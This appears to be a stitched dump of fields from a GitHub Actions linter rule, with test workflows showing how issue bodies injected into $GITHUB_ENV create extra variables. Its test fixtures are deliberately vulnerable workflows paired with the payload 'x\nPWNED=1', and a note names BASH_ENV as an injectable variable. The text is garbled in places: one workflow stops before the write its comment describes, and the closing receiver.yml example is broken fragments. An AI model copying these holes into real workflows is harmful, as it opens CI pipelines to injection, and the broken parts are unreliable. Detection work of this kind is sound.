notes.reason: in a run of the linter that adds variables-writer or secrets-writer, the rule reads each value of vars and secrets as a value that the attacker writes. In a repository that is not a fork, the job runs only for a pull request from a fork, and such a workflow run has no secret except GITHUB_TOKEN and a GITHUB_TOKEN that only reads, unless the settings of a private repository send secrets or a GITHUB_TOKEN that writes to the workflow runs for pull requests from forks (the facts repo.fork-pr-secrets and repo.fork-pr-write-tokens). The attacker who writes a variable or a secret gets nothing from the job that the author of the pull request does not get from the code of the pull request.
notes.cause: the rule counts every workflow run of the event pull_request, and does not tell a workflow run for a pull request from a fork from a workflow run for a pull request from a branch of the repository.
notes.attack_run_behavior: a pull request from a branch of the repository does not start the job, as the head repository of such a pull request is the repository itself; a pull request from a fork starts the job with no secret and a GITHUB_TOKEN that only reads, so the value reaches no secret and no token that writes.

rules.expected: no value an attacker writes with line breaks is written to $GITHUB_ENV with its line breaks, or with a delimiter an attacker can write

preconditions.text: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The finding is conditional when no file of facts and no --fact answers the facts

true_positives.name: controlled.custom-shell.yml
true_positives.text:
# situation: on issues opened, a step whose shell: is bash -e {0} writes
#   body= and the issue's body to $GITHUB_ENV.
# reason: the runner runs the script in bash with -e, which reads the
#   script as shell: bash does; anyone who opens an issue writes the body of
#   the issue, and the runner reads $GITHUB_ENV one line at a time as
#   NAME=value, so a line of the body such as BASH_ENV=... becomes a
#   separate variable.
# attack-value: github.event.issue.body = "x\nPWNED=1"
# attack-run-behavior: BODY holds x, a line break and PWNED=1, so echo
#   appends the two lines body=x and PWNED=1 to $GITHUB_ENV; the runner
#   reads each line as NAME=value and sets body to x and PWNED to 1 for the
#   later steps.
on:
  issues:
    types: [opened]
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - shell: bash -e {0}
        env:
          BODY: ${{ github.event.issue.body }}
        run: echo "body=$BODY" >> "$GITHUB_ENV"

notes.situation: on issues opened, a step whose shell: is bash -e {0} writes body= and the issue's body to $GITHUB_ENV.
notes.reason: the runner runs the script in bash with -e, which reads the script as shell: bash does; anyone who opens an issue writes the body of the issue, and the runner reads $GITHUB_ENV one line at a time as NAME=value, so a line of the body such as BASH_ENV=... becomes a separate variable.
notes.attack_run_behavior: BODY holds x, a line break and PWNED=1, so echo appends the two lines body=x and PWNED=1 to $GITHUB_ENV; the runner reads each line as NAME=value and sets body to x and PWNED to 1 for the later steps.

true_positives.name: controlled.descriptor-copied-before-close.yml
true_positives.text:
# situation: on issues opened, a step opens a descriptor on $GITHUB_ENV with
#   exec {fd}, copies its number to b with [[ b=fd -gt 0 ]], opens a new
#   descriptor for fd on /dev/null when QUIET is set, closes the descriptor
#   whose number fd holds with exec {fd}>&-, and writes V= and the issue's
#   body to the descriptor whose number b holds.
# reason: QUIET is set in the step, so exec {fd}>&- closes the descriptor on
#   /dev/null, b still holds the number of the descriptor on $GITHUB_ENV,
#   and the body goes to $GITHUB_ENV.
# attack-value: github.event.issue.body = "x\nPWNED=1"
# attack-run-behavior: the value goes to $GITHUB_ENV.
on:
  issues:
    types: [opened]
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          V: ${{ github.event.issue.body }}
          QUIET: "1"
        run: |
          exec {fd}>>"$GITHUB_ENV"
          [[ b=fd -gt 0 ]]
          if [ -n "$QUIET" ]; then exec {fd}>/dev/null; fi
          exec {fd}>&-
          echo "V=$V" >&$b

notes.situation: on issues opened, a step opens a descriptor on $GITHUB_ENV with exec {fd}, copies its number to b with [[ b=fd -gt 0 ]], opens a new descriptor for fd on /dev/null when QUIET is set, closes the descriptor whose number fd holds with exec {fd}>&-, and writes V= and the issue's body to the descriptor whose number b holds.
notes.reason: QUIET is set in the step, so exec {fd}>&- closes the descriptor on /dev/null, b still holds the number of the descriptor on $GITHUB_ENV, and the body goes to $GITHUB_ENV.
notes.attack_run_behavior: the value goes to $GITHUB_ENV.

true_positives.name: controlled.descriptor-opened-before-call.yml
true_positives.text:
# situation: on issues opened, a step defines a function that writes V= and the
#   issue's body to descriptor 3, opens descriptor 3 on $GITHUB_ENV with
#   exec, and calls the function.
# reason: the function runs where it is called, where descriptor 3 is open
#   on $GITHUB_ENV, so a line break in the body adds another environment
#   variable.
# attack-value: github.event.issue.body = "x\nPWNED=1"
# attack-run-behavior: the runner sets PWNED=1 as an environment variable of the
#   steps after.
on:
  issues:
    types: [opened]
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          V: ${{ github.event.issue.body }}
        run: |
          f() { echo "V=$V" >&3; }
          exec 3>> "$GITHUB_ENV"
          f

notes.reason: the function runs where it is called, where descriptor 3 is open on $GITHUB_ENV, so a line break in the body adds another environment variable.

true_positives.name: controlled.jump-path.yml
true_positives.text:
# situation: on issues opened, a step sets out to /dev/null; in a for loop,
#   the step sets out to $GITHUB_ENV, leaves the loop with break when STOP
#   is empty, and sets out to /dev/null after the break; after the loop,
#   the step writes V= and the issue's body to "$out".
# reason: STOP is not set in the step, so the
#   loop ends at the break with out holding $GITHUB_ENV, and the body goes
#   to $GITHUB_ENV.
# attack-value: github.event.issue.body = "x\nPWNED=1"
# attack-run-behavior: the value goes to $GITHUB_ENV.
on:
  issues:
    types: [opened]
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          V: ${{ github.event.issue.body }}
        run: |
          out=/dev/null
          for i in 1 2; do out=$GITHUB_ENV; [ -z "$STOP" ] && break; out=/dev/null; done

fix_kinds.title: move the expressions into the env of the step and read them as "${NAME}" where they were unquoted (bash and sh), as $env:NAME (pwsh) or as process.env.NAME (github-script); take the line breaks out of what is written to $GITHUB_ENV or $GITHUB_OUTPUT, or make the delimiter of name<<DELIM random

possible_side_effects.text: An unquoted place becomes one word: a value with blanks is no longer read as several words, and outside [[ ]] is no longer globbed.
On the right of ==, =, != or =~ inside [[ ]], the value is compared as a string, not matched as a pattern or a regular expression.
The rule does not read the quoting of pwsh, so how $env:NAME is read at that place is not checked.
The rule does not read the JavaScript of github-script, so how process.env.NAME is read at that place is not checked.
The line breaks of a value written to $GITHUB_ENV or $GITHUB_OUTPUT are taken out, which changes a value that had them.
The random delimiter is made with od and /dev/urandom; in a container without them the step fails.

The value of the ${{ }} expression is no longer parsed by the program that reads the script (the shell, or the JavaScript runtime of actions/github-script) as part of the script text: characters of the value that the program interpreted before the fix (such as $, `, \, double quotes and line breaks) are taken as plain characters, and a workflow that relied on the program interpreting those characters runs differently.

undetected_forms.text: a job that runs only on pull_request, in one of two cases. In the first case, only the pull requests of the repository run the workflow: the author of a pull request can change the workflow itself, so the run of the job gives the author what the run has (read-only from a fork, or what a private repository sends to the runs of pull requests from forks: secrets, a token that writes) without the flaw of the rule, and the flaw of the rule adds nothing to what the author gets. In the second case, a ruleset of the organization or the enterprise runs the workflow on the pull requests of its other repositories (Require workflows to pass before merging, of GitHub Enterprise): the author of such a pull request cannot change the workflow, and whether the run has more than the pull_request workflow of the author would get (the token, secrets) is known from GitHub's documentation only, as no such run was observed; making a required check pass is outside the threat model of the rule. The workflow does not say which case holds, and the rule does not read which case holds

undetected_forms.text: a value of the event of workflow_dispatch other than its inputs, in a job that runs only on workflow_dispatch: the event has the ref, which is a branch or a tag that the repository already has, and values that GitHub fills, such as the login of the account that dispatches the workflow; the event has no text of an issue, a comment or a pull request. Whoever dispatches the workflow chooses the ref and the inputs of the dispatch, and nothing else of the event. A token that cannot change the files of the repository can dispatch the workflow, such as a fine-grained token that has the permission Actions with write access and no permission Contents. The rule reports an input of the dispatch with the inconclusive kind input-dispatch

examples.name: .github/workflows/receiver.yml

# situation: sender.yml runs on issues opened, and with the GITHUB_TOKEN

#   the value to receiver.yml in a repository_dispatch that a run of the
#   repository sends with a token of the repository; GitHub creates a workflow
#   run for a repository_dispatch sent with the GITHUB_TOKEN, as an exception
#   to the rule that an event that the GITHUB_TOKEN triggers creates no
#   workflow run.

#   what a workflow sends to another workflow as the client_payload of a
#   repository_dispatch.
